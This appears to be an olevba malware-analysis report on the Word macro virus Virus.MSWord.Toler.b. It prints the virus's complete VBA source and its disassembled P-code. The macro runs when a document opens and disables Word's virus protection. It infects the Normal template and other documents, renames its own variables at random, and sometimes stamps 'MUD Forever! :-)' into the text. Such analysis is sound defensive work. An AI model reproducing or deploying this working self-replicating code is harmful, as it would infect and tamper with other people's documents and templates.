olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Toler.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Toler.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type YofonZ
  DcyyneZ As Integer
  QshrkkfkZ As Integer
  XrwkZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim ArulkZ As Object, HrvumZ As Object
  Set ArulkZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set HrvumZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim MchZ As YofonZ, DluiZ As YofonZ: MchZ = HkktlyZ(ArulkZ): DluiZ = HkktlyZ(HrvumZ)
  If DluiZ.QshrkkfkZ = 0 Then
     PuqcumZ ArulkZ, HrvumZ, MchZ, DluiZ
     Options.SaveNormalPrompt = False
  End If
  If (MchZ.QshrkkfkZ = 0) Or ((DluiZ.QshrkkfkZ <> 0) And (MchZ.QshrkkfkZ <> DluiZ.QshrkkfkZ)) Then
     PuqcumZ HrvumZ, ArulkZ, DluiZ, MchZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub PuqcumZ(DcyyneZ As Object, DiytuZ As Object, FromP As YofonZ, ToP As YofonZ)
  Dim FnrnZ As String, XnheefZ
  FnrnZ = DcyyneZ.Lines(FromP.DcyyneZ, FromP.QshrkkfkZ)
  XnheefZ = Array("HrgxlZ", "YofonZ", "DcyyneZ", "DiytuZ", "ErledbvZ", "QshrkkfkZ", "XrwkZ", "ArulkZ", "HrvumZ", "MchZ", "DluiZ", "PuqcumZ", "FnrnZ", "HypvkZ", "JfvghaZ", "NkgksZ", "HkktlyZ", "XkohZ", "XnheefZ")
  For I = 0 To 18: XkohZ FnrnZ, (XnheefZ(I)), HrgxlZ(FnrnZ): Next I
  If ToP.XrwkZ Then DiytuZ.DeleteLines 1, DiytuZ.CountOfLines
  DiytuZ.AddFromString FnrnZ
End Sub
Private Function HrgxlZ(FnrnZ As String) As String
  Dim HypvkZ As String: HypvkZ = ""
  While (InStr(FnrnZ, HypvkZ) <> 0) Or (Len(HypvkZ) < 3)
     HypvkZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(HypvkZ) = 0 Then
                  HypvkZ = HypvkZ + Chr(Int(Rnd * 25 + 65))
            Else: HypvkZ = HypvkZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     HypvkZ = HypvkZ + "Z"
  Wend
  HrgxlZ = HypvkZ
End Function
Private Sub XkohZ(FnrnZ As String, JfvghaZ As String, NkgksZ As String)
  Dim I As Long
  I = 1
  While InStr(I, FnrnZ, JfvghaZ) <> 0
        I = InStr(I, FnrnZ, JfvghaZ)
        FnrnZ = Left(FnrnZ, I - 1) + NkgksZ + Mid$(FnrnZ, I + Len(JfvghaZ))
        Index = Index + 1
  Wend
End Sub
Private Function HkktlyZ(ErledbvZ As Object) As YofonZ
  HkktlyZ.DcyyneZ = 0
  HkktlyZ.QshrkkfkZ = 0
  HkktlyZ.XrwkZ = False
  For I = 1 To ErledbvZ.CountOfLines
   If ErledbvZ.Lines(I, 1) = "' Tolerance!" Then HkktlyZ.DcyyneZ = I
   If ErledbvZ.Lines(I, 1) = "End Function 'Tolerance!" Then HkktlyZ.QshrkkfkZ = I - HkktlyZ.DcyyneZ + 1
   If InStr(ErledbvZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then HkktlyZ.XrwkZ = True
  Next I
End Function 'Tolerance!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Toler.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5967 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B " Tolerance!"
' Line #1:
' 	Type (Private) YofonZ
' Line #2:
' 	DimImplicit 
' 	VarDefn DcyyneZ (As Integer)
' Line #3:
' 	DimImplicit 
' 	VarDefn QshrkkfkZ (As Integer)
' Line #4:
' 	DimImplicit 
' 	VarDefn XrwkZ (As Boolean)
' Line #5:
' 	EndType 
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub Document_Open())
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	Dim 
' 	VarDefn ArulkZ (As Object)
' 	VarDefn HrvumZ (As Object)
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ArulkZ 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set HrvumZ 
' Line #17:
' 	Dim 
' 	VarDefn MchZ (As YofonZ)
' 	VarDefn DluiZ (As YofonZ)
' 	BoS 0x0000 
' 	Ld ArulkZ 
' 	ArgsLd HkktlyZ 0x0001 
' 	St MchZ 
' 	BoS 0x0000 
' 	Ld HrvumZ 
' 	ArgsLd HkktlyZ 0x0001 
' 	St DluiZ 
' Line #18:
' 	Ld DluiZ 
' 	MemLd QshrkkfkZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld ArulkZ 
' 	Ld HrvumZ 
' 	Ld MchZ 
' 	Ld DluiZ 
' 	ArgsCall PuqcumZ 0x0004 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld MchZ 
' 	MemLd QshrkkfkZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld DluiZ 
' 	MemLd QshrkkfkZ 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld MchZ 
' 	MemLd QshrkkfkZ 
' 	Ld DluiZ 
' 	MemLd QshrkkfkZ 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #23:
' 	Ld HrvumZ 
' 	Ld ArulkZ 
' 	Ld DluiZ 
' 	Ld MchZ 
' 	ArgsCall PuqcumZ 0x0004 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #25:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	ElseIfBlock 
' Line #26:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertParagraphBefore 0x0000 
' Line #27:
' 	LitStr 0x0010 "MUD Forever! :-)"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Private Sub PuqcumZ(DcyyneZ As Object, DiytuZ As Object, FromP As , ToP As ))
' Line #32:
' 	Dim 
' 	VarDefn FnrnZ (As String)
' 	VarDefn XnheefZ
' Line #33:
' 	Ld FromP 
' 	MemLd DcyyneZ 
' 	Ld FromP 
' 	MemLd QshrkkfkZ 
' 	Ld DcyyneZ 
' 	ArgsMemLd Lines 0x0002 
' 	St FnrnZ 
' Line #34:
' 	LitStr 0x0006 "HrgxlZ"
' 	LitStr 0x0006 "YofonZ"
' 	LitStr 0x0007 "DcyyneZ"
' 	LitStr 0x0006 "DiytuZ"
' 	LitStr 0x0008 "ErledbvZ"
' 	LitStr 0x0009 "QshrkkfkZ"
' 	LitStr 0x0005 "XrwkZ"
' 	LitStr 0x0006 "ArulkZ"
' 	LitStr 0x0006 "HrvumZ"
' 	LitStr 0x0004 "MchZ"
' 	LitStr 0x0005 "DluiZ"
' 	LitStr 0x0007 "PuqcumZ"
' 	LitStr 0x0005 "FnrnZ"
' 	LitStr 0x0006 "HypvkZ"
' 	LitStr 0x0007 "JfvghaZ"
' 	LitStr 0x0006 "NkgksZ"
' 	LitStr 0x0007 "HkktlyZ"
' 	LitStr 0x0005 "XkohZ"
' 	LitStr 0x0007 "XnheefZ"
' 	ArgsArray Array 0x0013 
' 	St XnheefZ 
' Line #35:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0012 
' 	For 
' 	BoS 0x0000 
' 	Ld FnrnZ 
' 	Ld I 
' 	ArgsLd XnheefZ 0x0001 
' 	Paren 
' 	Ld FnrnZ 
' 	ArgsLd HrgxlZ 0x0001 
' 	ArgsCall XkohZ 0x0003 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	Ld ToP 
' 	MemLd XrwkZ 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld DiytuZ 
' 	MemLd CountOfLines 
' 	Ld DiytuZ 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #37:
' 	Ld FnrnZ 
' 	Ld DiytuZ 
' 	ArgsMemCall AddFromString 0x0001 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Private Function HrgxlZ(FnrnZ As String, id_FFFE As String) As String)
' Line #40:
' 	Dim 
' 	VarDefn HypvkZ (As String)
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St HypvkZ 
' Line #41:
' 	Ld FnrnZ 
' 	Ld HypvkZ 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld HypvkZ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	Paren 
' 	Or 
' 	While 
' Line #42:
' 	LitStr 0x0000 ""
' 	St HypvkZ 
' Line #43:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #44:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #45:
' 	Ld HypvkZ 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	Ld HypvkZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St HypvkZ 
' Line #47:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld HypvkZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St HypvkZ 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Ld HypvkZ 
' 	LitStr 0x0001 "Z"
' 	Add 
' 	St HypvkZ 
' Line #52:
' 	Wend 
' Line #53:
' 	Ld HypvkZ 
' 	St HrgxlZ 
' Line #54:
' 	EndFunc 
' Line #55:
' 	FuncDefn (Private Sub XkohZ(FnrnZ As String, JfvghaZ As String, NkgksZ As String))
' Line #56:
' 	Dim 
' 	VarDefn I (As Long)
' Line #57:
' 	LitDI2 0x0001 
' 	St I 
' Line #58:
' 	Ld I 
' 	Ld FnrnZ 
' 	Ld JfvghaZ 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #59:
' 	Ld I 
' 	Ld FnrnZ 
' 	Ld JfvghaZ 
' 	FnInStr3 
' 	St I 
' Line #60:
' 	Ld FnrnZ 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld NkgksZ 
' 	Add 
' 	Ld FnrnZ 
' 	Ld I 
' 	Ld JfvghaZ 
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St FnrnZ 
' Line #61:
' 	Ld Index 
' 	LitDI2 0x0001 
' 	Add 
' 	St Index 
' Line #62:
' 	Wend 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Function HkktlyZ(ErledbvZ As Object, id_FFFE As ) As <crash>)
' Line #65:
' 	LitDI2 0x0000 
' 	Ld HkktlyZ 
' 	MemSt DcyyneZ 
' Line #66:
' 	LitDI2 0x0000 
' 	Ld HkktlyZ 
' 	MemSt QshrkkfkZ 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld HkktlyZ 
' 	MemSt XrwkZ 
' Line #68:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ErledbvZ 
' 	MemLd CountOfLines 
' 	For 
' Line #69:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld ErledbvZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "' Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld HkktlyZ 
' 	MemSt DcyyneZ 
' 	EndIf 
' Line #70:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld ErledbvZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0018 "End Function 'Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld HkktlyZ 
' 	MemLd DcyyneZ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld HkktlyZ 
' 	MemSt QshrkkfkZ 
' 	EndIf 
' Line #71:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld ErledbvZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld HkktlyZ 
' 	MemSt XrwkZ 
' 	EndIf 
' Line #72:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000A "Tolerance!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

